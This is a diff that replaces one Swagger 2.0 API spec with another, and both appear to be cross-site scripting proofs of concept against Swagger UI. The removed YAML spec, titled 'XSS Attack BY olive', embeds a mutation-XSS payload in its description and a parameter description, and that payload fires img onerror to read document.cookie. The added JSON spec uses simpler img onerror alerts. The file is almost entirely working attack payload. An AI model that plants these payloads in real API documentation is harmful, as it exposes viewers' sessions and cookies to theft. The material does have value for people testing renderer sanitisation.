@@ -1,38 +1,24 @@
-swagger: '2.0'
-info:
-  title: XSS Attack BY olive
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
-paths:
-  /M0X0101:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - olive
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
-      parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-          format: int64
-          in: path
-          name: id
-          required: true
-          type: integer
-      responses:
-        '200':
-          description: No response was specified
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "XSS PoC - Petstore UI",
+    "version": "1.0",
+    "description": "<img src=x onerror=alert(document.domain)>"
+  },
+  "host": "api.example.com",
+  "basePath": "/",
+  "schemes": ["https"],
+  "paths": {
+    "/xss": {
+      "get": {
+        "summary": "Trigger XSS",
+        "description": "<img src=x onerror=alert('SwaggerUI')>",
+        "responses": {
+          "200": {
+            "description": "Success"
+          }
+        }
+      }
+    }
+  }
+}
